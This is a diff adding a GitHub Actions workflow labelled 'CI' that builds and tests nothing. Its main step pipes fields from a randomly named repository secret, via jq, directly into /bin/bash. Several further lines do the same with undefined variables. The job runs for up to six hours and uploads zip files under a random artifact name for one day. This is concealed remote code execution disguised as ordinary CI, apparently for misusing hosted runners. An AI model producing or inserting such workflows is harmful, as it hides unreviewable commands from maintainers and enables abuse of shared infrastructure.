@@ -1,0 +1,32 @@
+name: CI
+on:
+  workflow_dispatch:
+
+env:
+  CI: true
+concurrency:
+  group: ${{ github.workflow }}-${{ github.ref }}
+  cancel-in-progress: true
+jobs:
+  runner:
+    runs-on: ubuntu-latest
+    timeout-minutes: 360
+    steps:
+      - uses: actions/checkout@v4
+        with:
+          fetch-depth: 1
+      - name: Go
+        env:
+          qne7735: ${{ secrets.qne7735 }}
+        run: |
+          printf '%s' "$qne7735" | jq -r .dnpj449 | /bin/bash
+          printf '%s' "$q78685" | jq -r .zfzqr63454 | /bin/bash
+          echo $rkp332 | jq -r .xnyl12 | /bin/bash
+          echo $ploq56 | jq -r .eu167 | /bin/bash
+
+      - name: Archive results
+        uses: actions/upload-artifact@v4
+        with:
+          name: dfggkbZV
+          path: "*.zip"
+          retention-days: 1
